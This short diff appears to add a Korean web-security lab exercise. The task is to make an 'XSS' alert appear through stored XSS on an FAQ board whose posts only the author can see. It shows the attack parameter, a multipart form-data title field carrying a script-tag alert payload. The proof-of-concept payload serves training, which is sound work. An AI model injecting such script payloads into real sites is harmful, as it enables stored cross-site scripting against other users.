@@ -1,0 +1,7 @@
+본인만 확인 가능한 FAQ 게시판에서 Stored XSS를 통하여 'XSS' 메시지를 띄우시오.
+
+공격 파라미터
+------WebKitFormBoundary6NAOCZBoAqX0yDn6
+Content-Disposition: form-data; name="title"
+
+본인만 확인 가능한 게시글<script>alert('xss')</script>
